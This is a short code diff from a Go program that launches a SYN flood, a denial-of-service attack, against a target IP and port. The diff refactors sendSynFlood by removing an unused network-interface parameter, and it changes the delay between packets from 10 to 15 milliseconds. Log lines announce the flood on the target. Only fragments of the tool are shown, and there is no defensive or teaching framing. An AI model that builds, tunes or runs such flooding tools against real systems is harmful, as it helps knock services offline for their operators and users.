@@ -45,7 +45,7 @@ func resolveDNS(domain string) (net.IP, error) {
 }
 
 // Send SYN flood
-func sendSynFlood(target string, port uint16, numPackets int, randSource *rand.Rand, networkInterface string, wg *sync.WaitGroup, handle *pcap.Handle) {
+func sendSynFlood(target string, port uint16, numPackets int, randSource *rand.Rand, wg *sync.WaitGroup, handle *pcap.Handle) {
 	log.Printf("Starting SYN flood on %s:%d with %d packets\n", target, port, numPackets)
 
 	// Loop to send packets
@@ -92,7 +92,7 @@ func sendSynFlood(target string, port uint16, numPackets int, randSource *rand.R
 			wg.Done()
 		}(i)
 
-		time.Sleep(10 * time.Millisecond)
+		time.Sleep(15 * time.Millisecond)
 	}
 
 	wg.Wait()
@@ -132,7 +132,7 @@ func main() {
 	log.Printf("Launching SYN Flood on %s:%d with %d packets using interface %s\n", targetIP, port, numPackets, networkInterface)
 
 	var wg sync.WaitGroup
-	sendSynFlood(targetIP.String(), port, numPackets, randSource, networkInterface, &wg, handle)
+	sendSynFlood(targetIP.String(), port, numPackets, randSource, &wg, handle)
 
 	wg.Wait()
 
